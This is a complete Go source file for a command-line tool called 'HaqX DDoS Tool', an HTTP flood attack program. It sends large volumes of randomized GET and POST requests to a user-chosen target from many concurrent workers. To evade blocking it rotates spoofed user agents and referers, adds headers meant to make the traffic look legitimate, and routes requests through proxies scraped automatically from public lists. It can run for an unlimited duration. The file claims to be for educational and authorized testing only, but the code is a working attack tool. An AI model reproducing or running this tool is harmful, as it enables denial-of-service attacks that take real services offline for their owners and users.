package main

/*
 HaqX DDoS Tool - Enhanced with Auto Proxy & Rotation
 NOTE: This tool is for educational and authorized testing purposes only.
*/

import (
	"bufio"
	"context"
	"crypto/tls"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
)

const __version__ = "3.0.0"

const (
	acceptCharset = "ISO-8859-1,utf-8;q=0.7,*;q=0.7"
)

const (
	callGotOk uint8 = iota
	callExitOnErr
	callExitOnTooManyFiles
	targetComplete
)

var (
	safeMode bool = false
	debug    bool = false
	stats    *Statistics
)

type Statistics struct {
	sync.RWMutex
	RequestsSent   int64
	RequestsFailed int64
	StatusCodes    map[int]int64
	StartTime      time.Time
}

type Config struct {
	TargetURL       string
	MaxConnections  int
	Timeout         time.Duration
	RateLimit       int
	Data            string
	Headers         []string
	UserAgents      []string
	Referers        []string
	SafeMode        bool
	Debug           bool
	EnableTLSVerify bool
	MaxRetries      int
	AttackDuration  int
	Method          string
	UseProxy        bool
	ProxyList       []string
	CurrentProxy    int
	ProxyMutex      sync.Mutex
}

type ProxyProvider struct {
	URLs     []string
	LastFetch time.Time
	Mutex    sync.Mutex
}

func DefaultConfig() *Config {
	return &Config{
		Timeout:         15 * time.Second,
		RateLimit:       200,
		MaxConnections:  150,
		EnableTLSVerify: false,
		MaxRetries:      4,
		Method:          "GET",
		AttackDuration:  0,
		UseProxy:        true,
		UserAgents: []string{
			"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
			"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
			"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
			"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
			"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0",
			"Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
			"Mozilla/5.0 (iPad; CPU OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
			"Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
			"Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
			"curl/8.4.0",
			"Wget/1.21.4",
			"Python-urllib/3.11",
			"Go-http-client/2.0",
		},
		Referers: []string{
			"https://www.google.com/search?q=",
			"https://www.bing.com/search?q=",
			"https://duckduckgo.com/?q=",
			"https://www.reddit.com/search/?q=",
			"https://www.youtube.com/results?search_query=",
			"https://twitter.com/search?q=",
			"https://www.facebook.com/search/top?q=",
			"https://www.instagram.com/explore/search/?q=",
			"https://www.linkedin.com/search/results/all/?keywords=",
			"https://github.com/search?q=",
			"https://stackoverflow.com/search?q=",
		},
	}
}

func (c *Config) GetNextProxy() string {
	c.ProxyMutex.Lock()
	defer c.ProxyMutex.Unlock()
	
	if len(c.ProxyList) == 0 {
		return ""
	}
	
	proxy := c.ProxyList[c.CurrentProxy]
	c.CurrentProxy = (c.CurrentProxy + 1) % len(c.ProxyList)
	return proxy
}

type HTTPClientPool struct {
	clients   []*http.Client
	mu        sync.Mutex
	nextIndex int
	config    *Config
}

func NewHTTPClientPool(size int, timeout time.Duration, verifyTLS bool, config *Config) *HTTPClientPool {
	pool := &HTTPClientPool{
		clients: make([]*http.Client, size),
		config:  config,
	}

	for i := 0; i < size; i++ {
		pool.clients[i] = createHTTPClient(timeout, verifyTLS, config)
	}

	return pool
}

func createHTTPClient(timeout time.Duration, verifyTLS bool, config *Config) *http.Client {
	transport := &http.Transport{
		MaxIdleConns:        100,
		MaxIdleConnsPerHost: 20,
		MaxConnsPerHost:     20,
		IdleConnTimeout:     90 * time.Second,
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: !verifyTLS,
		},
		DisableKeepAlives:  false,
		DisableCompression: false,
		ForceAttemptHTTP2:  true,
	}
	
	// Add proxy if enabled
	if config.UseProxy && len(config.ProxyList) > 0 {
		proxyURL := config.GetNextProxy()
		if proxyURL != "" {
			if proxy, err := url.Parse(proxyURL); err == nil {
				transport.Proxy = http.ProxyURL(proxy)
			}
		}
	}
	
	return &http.Client{
		Timeout:   timeout,
		Transport: transport,
	}
}

func (p *HTTPClientPool) GetClient() *http.Client {
	p.mu.Lock()
	defer p.mu.Unlock()
	
	// Rotate proxy if enabled
	if p.config.UseProxy && len(p.config.ProxyList) > 0 {
		// Create new client with fresh proxy
		client := createHTTPClient(p.clients[0].Timeout, true, p.config)
		return client
	}
	
	client := p.clients[p.nextIndex]
	p.nextIndex = (p.nextIndex + 1) % len(p.clients)
	return client
}

func (p *HTTPClientPool) Close() {
	for _, client := range p.clients {
		if client.Transport != nil {
			if transport, ok := client.Transport.(*http.Transport); ok {
				transport.CloseIdleConnections()
			}
		}
	}
}

type RateLimiter struct {
	tokens     chan struct{}
	interval   time.Duration
	mu         sync.Mutex
	lastRefill time.Time
	stopChan   chan struct{}
}

func NewRateLimiter(rate int) *RateLimiter {
	if rate <= 0 {
		return nil
	}
	
	rl := &RateLimiter{
		tokens:     make(chan struct{}, rate*2),
		interval:   time.Second / time.Duration(rate),
		lastRefill: time.Now(),
		stopChan:   make(chan struct{}),
	}

	// Fill with burst capacity
	for i := 0; i < rate*2; i++ {
		select {
		case rl.tokens <- struct{}{}:
		default:
		}
	}

	go rl.refillLoop()
	return rl
}

func (rl *RateLimiter) refillLoop() {
	ticker := time.NewTicker(rl.interval)
	defer ticker.Stop()

	for {
		select {
		case <-rl.stopChan:
			return
		case <-ticker.C:
			rl.mu.Lock()
			now := time.Now()
			if now.Sub(rl.lastRefill) >= rl.interval {
				select {
				case rl.tokens <- struct{}{}:
				default:
				}
				rl.lastRefill = now
			}
			rl.mu.Unlock()
		}
	}
}

func (rl *RateLimiter) Stop() {
	if rl != nil {
		close(rl.stopChan)
	}
}

func (rl *RateLimiter) Wait(ctx context.Context) error {
	select {
	case <-rl.tokens:
		return nil
	case <-ctx.Done():
		return ctx.Err()
	}
}

func main() {
	config := DefaultConfig()
	
	var (
		version     bool
		agents      string
		headers     arrayFlags
		connections int
		timeout     int
		rateLimit   int
		duration    int
		method      string
		noProxy     bool
	)

	flag.BoolVar(&version, "version", false, "Print version and exit")
	flag.BoolVar(&safeMode, "safe", false, "Auto-shutdown after detecting server error")
	flag.BoolVar(&debug, "debug", false, "Enable debug mode with verbose output")
	flag.BoolVar(&noProxy, "no-proxy", false, "Disable proxy auto-download")
	flag.StringVar(&agents, "agents", "", "File containing user-agent list")
	flag.StringVar(&config.Data, "data", "", "Data for POST requests")
	flag.IntVar(&connections, "connections", 0, "Maximum concurrent connections (0 for manual input)")
	flag.IntVar(&timeout, "timeout", 0, "Request timeout in seconds (0 for manual input)")
	flag.IntVar(&rateLimit, "rate", 0, "Requests per second (0 for manual input)")
	flag.IntVar(&duration, "duration", 0, "Attack duration in seconds (0 = unlimited)")
	flag.StringVar(&method, "method", "", "HTTP method (GET/POST)")
	flag.Var(&headers, "header", "Custom headers (can be used multiple times)")
	flag.Parse()

	if version {
		fmt.Printf("HaqX v%s\n", __version__)
		os.Exit(0)
	}

	config.Headers = headers
	if connections > 0 {
		config.MaxConnections = connections
	}
	if timeout > 0 {
		config.Timeout = time.Duration(timeout) * time.Second
	}
	if rateLimit > 0 {
		config.RateLimit = rateLimit
	}
	if duration > 0 {
		config.AttackDuration = duration
	}
	if method != "" {
		config.Method = strings.ToUpper(method)
	}
	if noProxy {
		config.UseProxy = false
	}
	config.SafeMode = safeMode
	config.Debug = debug

	printBanner()
	fmt.Println("Enter attack parameters (press Enter to use defaults)")
	fmt.Println()
	
	reader := bufio.NewReader(os.Stdin)
	
	fmt.Print("🎯 Target URL (e.g., http://localhost:8080): ")
	targetInput, _ := reader.ReadString('\n')
	targetInput = strings.TrimSpace(targetInput)
	
	for targetInput == "" {
		fmt.Print("⚠️ Target URL cannot be empty. Please enter target URL: ")
		targetInput, _ = reader.ReadString('\n')
		targetInput = strings.TrimSpace(targetInput)
	}
	
	if !strings.HasPrefix(targetInput, "http://") && !strings.HasPrefix(targetInput, "https://") {
		targetInput = "http://" + targetInput
	}
	
	config.TargetURL = targetInput
	parsedURL, err := url.Parse(config.TargetURL)
	if err != nil {
		fmt.Printf("❌ Error parsing URL: %v\n", err)
		os.Exit(1)
	}
	fmt.Printf("✅ Target set to: %s\n", config.TargetURL)

	// Auto download proxies
	if config.UseProxy {
		fmt.Println("\n🌐 Downloading proxies from multiple sources...")
		proxyProvider := NewProxyProvider()
		proxies := proxyProvider.FetchAllProxies()
		if len(proxies) > 0 {
			config.ProxyList = proxies
			fmt.Printf("✅ Loaded %d proxies\n", len(proxies))
		} else {
			fmt.Println("⚠️ No proxies loaded, continuing without proxy")
			config.UseProxy = false
		}
	}

	fmt.Printf("\n🔢 Maximum concurrent connections [%d]: ", config.MaxConnections)
	connInput, _ := reader.ReadString('\n')
	connInput = strings.TrimSpace(connInput)
	if connInput != "" {
		if val, err := strconv.Atoi(connInput); err == nil && val > 0 {
			config.MaxConnections = val
		} else {
			fmt.Println("⚠️ Invalid input, using default:", config.MaxConnections)
		}
	}
	fmt.Printf("✅ Connections: %d\n", config.MaxConnections)

	fmt.Printf("\n⏱️ Request timeout (seconds) [%d]: ", int(config.Timeout.Seconds()))
	timeoutInput, _ := reader.ReadString('\n')
	timeoutInput = strings.TrimSpace(timeoutInput)
	if timeoutInput != "" {
		if val, err := strconv.Atoi(timeoutInput); err == nil && val > 0 {
			config.Timeout = time.Duration(val) * time.Second
		} else {
			fmt.Println("⚠️ Invalid input, using default:", int(config.Timeout.Seconds()))
		}
	}
	fmt.Printf("✅ Timeout: %v\n", config.Timeout)

	fmt.Printf("\n🚀 Requests per second (0 = unlimited) [%d]: ", config.RateLimit)
	rateInput, _ := reader.ReadString('\n')
	rateInput = strings.TrimSpace(rateInput)
	if rateInput != "" {
		if val, err := strconv.Atoi(rateInput); err == nil && val >= 0 {
			config.RateLimit = val
		} else {
			fmt.Println("⚠️ Invalid input, using default:", config.RateLimit)
		}
	}
	fmt.Printf("✅ Rate: %d req/s\n", config.RateLimit)

	fmt.Printf("\n📡 HTTP Method (GET/POST) [%s]: ", config.Method)
	methodInput, _ := reader.ReadString('\n')
	methodInput = strings.TrimSpace(strings.ToUpper(methodInput))
	if methodInput != "" {
		if methodInput == "GET" || methodInput == "POST" {
			config.Method = methodInput
		} else {
			fmt.Println("⚠️ Invalid method, using default:", config.Method)
		}
	}
	fmt.Printf("✅ Method: %s\n", config.Method)

	if config.Method == "POST" {
		fmt.Print("\n📝 POST Data (leave empty for random data): ")
		dataInput, _ := reader.ReadString('\n')
		dataInput = strings.TrimSpace(dataInput)
		if dataInput != "" {
			config.Data = dataInput
		} else {
			config.Data = generateRandomPostData()
			fmt.Printf("✅ Using random POST data: %s\n", config.Data)
		}
	}

	fmt.Printf("\n⏰ Attack duration (seconds, 0 = unlimited) [%d]: ", config.AttackDuration)
	durationInput, _ := reader.ReadString('\n')
	durationInput = strings.TrimSpace(durationInput)
	if durationInput != "" {
		if val, err := strconv.Atoi(durationInput); err == nil && val >= 0 {
			config.AttackDuration = val
		} else {
			fmt.Println("⚠️ Invalid input, using default:", config.AttackDuration)
		}
	}
	if config.AttackDuration > 0 {
		fmt.Printf("✅ Duration: %d seconds\n", config.AttackDuration)
	} else {
		fmt.Println("✅ Duration: Unlimited")
	}

	fmt.Printf("\n🛡️ Enable safe mode (stop on server error)? [%t]: ", config.SafeMode)
	safeInput, _ := reader.ReadString('\n')
	safeInput = strings.TrimSpace(strings.ToLower(safeInput))
	if safeInput != "" {
		if safeInput == "y" || safeInput == "yes" || safeInput == "true" {
			config.SafeMode = true
		} else {
			config.SafeMode = false
		}
	}
	fmt.Printf("✅ Safe mode: %t\n", config.SafeMode)

	fmt.Print("\n📄 User-Agent file (leave empty for default list): ")
	agentsInput, _ := reader.ReadString('\n')
	agentsInput = strings.TrimSpace(agentsInput)
	if agentsInput != "" {
		if data, err := os.ReadFile(agentsInput); err == nil {
			var customAgents []string
			for _, a := range strings.Split(string(data), "\n") {
				if trimmed := strings.TrimSpace(a); trimmed != "" {
					customAgents = append(customAgents, trimmed)
				}
			}
			if len(customAgents) > 0 {
				config.UserAgents = customAgents
				fmt.Printf("✅ Loaded %d user agents from file\n", len(customAgents))
			}
		} else {
			fmt.Printf("⚠️ Error loading user-agent list: %v, using default\n", err)
		}
	}

	fmt.Print("\n📋 Custom headers (format: key:value, multiple separated by comma): ")
	headersInput, _ := reader.ReadString('\n')
	headersInput = strings.TrimSpace(headersInput)
	if headersInput != "" {
		for _, hdr := range strings.Split(headersInput, ",") {
			parts := strings.SplitN(strings.TrimSpace(hdr), ":", 2)
			if len(parts) == 2 {
				config.Headers = append(config.Headers, strings.TrimSpace(parts[0])+": "+strings.TrimSpace(parts[1]))
			}
		}
		fmt.Printf("✅ Added %d custom headers\n", len(config.Headers))
	}

	if agents != "" {
		if data, err := os.ReadFile(agents); err == nil {
			var customAgents []string
			for _, a := range strings.Split(string(data), "\n") {
				if trimmed := strings.TrimSpace(a); trimmed != "" {
					customAgents = append(customAgents, trimmed)
				}
			}
			if len(customAgents) > 0 {
				config.UserAgents = customAgents
			}
		}
	}

	stats = &Statistics{
		StatusCodes: make(map[int]int64),
		StartTime:   time.Now(),
	}

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sigChan
		fmt.Println("\n⚠️ Received interrupt signal. Shutting down gracefully...")
		cancel()
	}()

	clientPool := NewHTTPClientPool(20, config.Timeout, config.EnableTLSVerify, config)
	defer clientPool.Close()

	var rateLimiter *RateLimiter
	if config.RateLimit > 0 {
		rateLimiter = NewRateLimiter(config.RateLimit)
		defer rateLimiter.Stop()
	}

	printConfig(config)

	runAttack(ctx, cancel, config, parsedURL, clientPool, rateLimiter)

	printFinalStats()
}

func NewProxyProvider() *ProxyProvider {
	return &ProxyProvider{
		URLs: []string{
			"https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
			"https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=10000&country=all&ssl=all&anonymity=all",
			"https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all",
			"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
			"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
			"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
			"https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/proxy.txt",
			"https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
			"https://www.proxy-list.download/api/v1/get?type=http",
			"https://www.proxy-list.download/api/v1/get?type=socks4",
			"https://www.proxy-list.download/api/v1/get?type=socks5",
		},
	}
}

func (p *ProxyProvider) FetchAllProxies() []string {
	var allProxies []string
	p.Mutex.Lock()
	defer p.Mutex.Unlock()
	
	for _, url := range p.URLs {
		proxies := p.fetchProxyList(url)
		if len(proxies) > 0 {
			allProxies = append(allProxies, proxies...)
			fmt.Printf("  📥 Fetched %d proxies from %s\n", len(proxies), url[:50]+"...")
		}
		time.Sleep(500 * time.Millisecond) // Rate limiting untuk fetching
	}
	
	// Remove duplicates
	uniqueProxies := make(map[string]bool)
	var result []string
	for _, proxy := range allProxies {
		if !uniqueProxies[proxy] {
			uniqueProxies[proxy] = true
			result = append(result, proxy)
		}
	}
	
	return result
}

func (p *ProxyProvider) fetchProxyList(url string) []string {
	client := &http.Client{
		Timeout: 10 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	
	resp, err := client.Get(url)
	if err != nil {
		return []string{}
	}
	defer resp.Body.Close()
	
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return []string{}
	}
	
	var proxies []string
	lines := strings.Split(string(body), "\n")
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line == "" || strings.HasPrefix(line, "#") || strings.HasPrefix(line, "//") {
			continue
		}
		
		// Validate proxy format
		parts := strings.Split(line, ":")
		if len(parts) == 2 {
			if _, err := strconv.Atoi(parts[1]); err == nil {
				proxies = append(proxies, line)
			}
		} else if strings.HasPrefix(line, "http://") || strings.HasPrefix(line, "socks4://") || strings.HasPrefix(line, "socks5://") {
			proxies = append(proxies, line)
		} else {
			// Try to parse as IP:PORT
			if strings.Contains(line, ":") {
				proxies = append(proxies, line)
			}
		}
	}
	
	return proxies
}

func generateRandomPostData() string {
	fields := []string{"username", "email", "password", "name", "message", "comment", "search", "query", "data", "value"}
	var params []string
	
	rng := rand.New(rand.NewSource(time.Now().UnixNano()))
	for i := 0; i < 5+rng.Intn(5); i++ {
		key := fields[rng.Intn(len(fields))]
		value := buildRandomString(5+rng.Intn(15), rng)
		params = append(params, fmt.Sprintf("%s=%s", key, value))
	}
	
	return strings.Join(params, "&")
}

func runAttack(ctx context.Context, cancel context.CancelFunc, config *Config, parsedURL *url.URL, clientPool *HTTPClientPool, rateLimiter *RateLimiter) {
	var wg sync.WaitGroup
	workerCount := config.MaxConnections
	activeWorkers := int32(0)

	workerDone := make(chan struct{}, workerCount)
	
	if config.AttackDuration > 0 {
		durationTimer := time.NewTimer(time.Duration(config.AttackDuration) * time.Second)
		go func() {
			<-durationTimer.C
			fmt.Println("\n⏰ Attack duration reached. Shutting down...")
			cancel()
		}()
	}

	fmt.Printf("\n🚀 Starting attack on %s\n", config.TargetURL)
	if config.UseProxy && len(config.ProxyList) > 0 {
		fmt.Printf("🌐 Using proxies: %d proxies loaded\n", len(config.ProxyList))
	}
	fmt.Printf("🔧 Workers: %d | Timeout: %v | Rate: %d req/s\n\n",
		workerCount, config.Timeout, config.RateLimit)

	for i := 0; i < workerCount; i++ {
		wg.Add(1)
		go func(workerID int) {
			defer wg.Done()
			defer func() { workerDone <- struct{}{} }()

			atomic.AddInt32(&activeWorkers, 1)
			defer atomic.AddInt32(&activeWorkers, -1)

			worker(ctx, workerID, config, parsedURL, clientPool, rateLimiter)
		}(i)
	}

	stopMonitor := make(chan struct{})
	go func() {
		ticker := time.NewTicker(2 * time.Second)
		defer ticker.Stop()

		for {
			select {
			case <-ctx.Done():
				return
			case <-stopMonitor:
				return
			case <-ticker.C:
				stats.RLock()
				sent := stats.RequestsSent
				failed := stats.RequestsFailed
				stats.RUnlock()

				active := atomic.LoadInt32(&activeWorkers)
				
				elapsed := time.Since(stats.StartTime).Seconds()
				var rate float64
				if elapsed > 0 {
					rate = float64(sent) / elapsed
				}
				
				fmt.Printf("\r📊 Requests: %d | ❌ Failed: %d | 🔥 Active: %d | ⚡ Rate: %.1f req/s | ⏱️ %v",
					sent, failed, active, rate, time.Since(stats.StartTime).Round(time.Second))
			}
		}
	}()

	wg.Wait()
	close(stopMonitor)
	close(workerDone)

	for range workerDone {
	}
}

func worker(ctx context.Context, workerID int, config *Config, parsedURL *url.URL, clientPool *HTTPClientPool, rateLimiter *RateLimiter) {
	host := parsedURL.Host
	rng := rand.New(rand.NewSource(time.Now().UnixNano() + int64(workerID)))

	for {
		select {
		case <-ctx.Done():
			return
		default:
			if rateLimiter != nil {
				if err := rateLimiter.Wait(ctx); err != nil {
					return
				}
			}
			
			// Get fresh client with potential new proxy
			client := clientPool.GetClient()

			if err := makeRequest(ctx, client, config, parsedURL, host, rng); err != nil {
				if config.Debug {
					fmt.Printf("\n🔴 Worker %d error: %v\n", workerID, err)
				}
				atomic.AddInt64(&stats.RequestsFailed, 1)
			} else {
				atomic.AddInt64(&stats.RequestsSent, 1)
			}
		}
	}
}

func makeRequest(ctx context.Context, client *http.Client, config *Config, parsedURL *url.URL, host string, rng *rand.Rand) error {
	var req *http.Request
	var err error

	for retry := 0; retry < config.MaxRetries; retry++ {
		select {
		case <-ctx.Done():
			return ctx.Err()
		default:
			if config.Method == "POST" {
				var body io.Reader
				if config.Data != "" {
					body = strings.NewReader(config.Data)
				} else {
					postData := generateRandomPostData()
					body = strings.NewReader(postData)
				}
				req, err = http.NewRequestWithContext(ctx, "POST", config.TargetURL, body)
				if err == nil {
					req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
				}
			} else {
				params := buildRandomParams(rng)
				fullURL := fmt.Sprintf("%s%s%s", config.TargetURL, getParamJoiner(parsedURL), params)
				req, err = http.NewRequestWithContext(ctx, "GET", fullURL, nil)
			}

			if err != nil {
				return err
			}

			setHeaders(req, config, host, rng)

			resp, err := client.Do(req)
			if err != nil {
				if retry < config.MaxRetries-1 {
					// Exponential backoff
					delay := time.Duration(100*(1<<uint(retry))) * time.Millisecond
					time.Sleep(delay)
					continue
				}
				return err
			}
			defer resp.Body.Close()

			_, _ = io.Copy(io.Discard, resp.Body)

			stats.Lock()
			stats.StatusCodes[resp.StatusCode]++
			stats.Unlock()

			if config.SafeMode && resp.StatusCode >= 500 {
				if config.Debug {
					fmt.Printf("\n⚠️ Server error %d detected\n", resp.StatusCode)
				}
				return fmt.Errorf("server error: %d", resp.StatusCode)
			}

			return nil
		}
	}

	return fmt.Errorf("max retries exceeded")
}

func setHeaders(req *http.Request, config *Config, host string, rng *rand.Rand) {
	userAgent := config.UserAgents[rng.Intn(len(config.UserAgents))]
	req.Header.Set("User-Agent", userAgent)

	req.Header.Set("Cache-Control", "no-cache")
	req.Header.Set("Accept-Charset", acceptCharset)
	req.Header.Set("Accept-Encoding", "gzip, deflate")
	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
	
	if len(config.Referers) > 0 {
		referer := config.Referers[rng.Intn(len(config.Referers))] + buildRandomString(5+rng.Intn(10), rng)
		req.Header.Set("Referer", referer)
	}

	keepAlive := 100 + rng.Intn(20)
	req.Header.Set("Keep-Alive", strconv.Itoa(keepAlive))
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("Host", host)

	// Random headers to look more legitimate
	if rng.Intn(2) == 0 {
		req.Header.Set("DNT", "1")
	}
	if rng.Intn(3) == 0 {
		req.Header.Set("Upgrade-Insecure-Requests", "1")
	}

	for _, hdr := range config.Headers {
		parts := strings.SplitN(hdr, ":", 2)
		if len(parts) == 2 {
			key := strings.TrimSpace(parts[0])
			value := strings.TrimSpace(parts[1])
			req.Header.Set(key, value)
		}
	}
}

func buildRandomParams(rng *rand.Rand) string {
	paramCount := 2 + rng.Intn(8)
	var params []string
	
	for i := 0; i < paramCount; i++ {
		key := buildRandomString(3+rng.Intn(10), rng)
		value := buildRandomString(3+rng.Intn(15), rng)
		params = append(params, fmt.Sprintf("%s=%s", key, value))
	}
	
	return strings.Join(params, "&")
}

func buildRandomString(length int, rng *rand.Rand) string {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-"
	result := make([]byte, length)
	for i := range result {
		result[i] = charset[rng.Intn(len(charset))]
	}
	return string(result)
}

func getParamJoiner(u *url.URL) string {
	if strings.ContainsRune(u.RawQuery, '?') || u.RawQuery != "" {
		return "&"
	}
	return "?"
}

func printBanner() {
	fmt.Println("\033[97m" + `██████╗  █████╗  ██████╗ ██╗  ██╗
██╔══██╗██╔══██╗██╔═══██╗╚██╗██╔╝
██████╔╝███████║██║   ██║ ╚███╔╝ 
██╔═══╝ ██╔══██║██║▄▄ ██║ ██╔██╗ 
██║     ██║  ██║╚██████╔╝██╔╝ ██╗
╚═╝     ╚═╝  ╚═╝ ╚══▀▀═╝ ╚═╝  ╚═╝` + "\033[0m")
	fmt.Println()
	fmt.Println("\033[97m" + "🔥 HaqX DDoS Tool v" + __version__ + " 🔥" + "\033[0m")
	fmt.Println("\033[97m" + "⚡ Educational & Testing Purposes Only ⚡" + "\033[0m")
	fmt.Println()
}

func printConfig(config *Config) {
	fmt.Println()
	fmt.Println("📋 ATTACK CONFIGURATION")
	fmt.Println("  🎯 Target:          " + config.TargetURL)
	fmt.Println("  🔢 Connections:     " + strconv.Itoa(config.MaxConnections))
	fmt.Println("  ⏱️  Timeout:          " + config.Timeout.String())
	fmt.Println("  🚀 Rate Limit:      " + strconv.Itoa(config.RateLimit) + " req/s")
	fmt.Println("  📡 Method:          " + config.Method)
	if config.Method == "POST" && config.Data != "" {
		fmt.Println("  📝 POST Data:       " + config.Data)
	}
	if config.AttackDuration > 0 {
		fmt.Println("  ⏰ Duration:        " + strconv.Itoa(config.AttackDuration) + " seconds")
	} else {
		fmt.Println("  ⏰ Duration:        ♾️ Unlimited")
	}
	fmt.Println("  🛡️  Safe Mode:       " + strconv.FormatBool(config.SafeMode))
	fmt.Println("  📄 User Agents:     " + strconv.Itoa(len(config.UserAgents)) + " loaded")
	if config.UseProxy && len(config.ProxyList) > 0 {
		fmt.Println("  🌐 Proxies:         " + strconv.Itoa(len(config.ProxyList)) + " loaded")
	} else {
		fmt.Println("  🌐 Proxies:         ❌ Disabled")
	}
	if len(config.Headers) > 0 {
		fmt.Println("  📋 Custom Headers:  " + strconv.Itoa(len(config.Headers)) + " added")
	}
	fmt.Println()
	
	fmt.Print("⚡ Press ENTER to start attack or Ctrl+C to abort...")
	bufio.NewReader(os.Stdin).ReadString('\n')
	fmt.Println()
}

func printFinalStats() {
	stats.RLock()
	defer stats.RUnlock()

	duration := time.Since(stats.StartTime).Round(time.Second)
	successRate := float64(0)
	total := stats.RequestsSent + stats.RequestsFailed
	if total > 0 {
		successRate = float64(stats.RequestsSent) / float64(total) * 100
	}

	fmt.Println()
	fmt.Println("📊 FINAL STATISTICS")
	fmt.Println("  ✅ Total Requests:      " + strconv.FormatInt(stats.RequestsSent, 10))
	fmt.Println("  ❌ Failed Requests:     " + strconv.FormatInt(stats.RequestsFailed, 10))
	fmt.Printf("  📈 Success Rate:        %.2f%%\n", successRate)
	fmt.Println("  ⏱️  Duration:             " + duration.String())
	
	if duration.Seconds() > 0 {
		fmt.Printf("  🚀 Requests per Second: %.2f\n", float64(stats.RequestsSent)/duration.Seconds())
	}

	fmt.Println()
	fmt.Println("  📋 Status Code Distribution:")
	if len(stats.StatusCodes) > 0 {
		for code, count := range stats.StatusCodes {
			fmt.Printf("    %d: %d\n", code, count)
		}
	} else {
		fmt.Println("    ❌ No status codes recorded")
	}
	fmt.Println()
}

type arrayFlags []string

func (i *arrayFlags) String() string {
	return strings.Join(*i, ", ")
}

func (i *arrayFlags) Set(value string) error {
	*i = append(*i, value)
	return nil
}
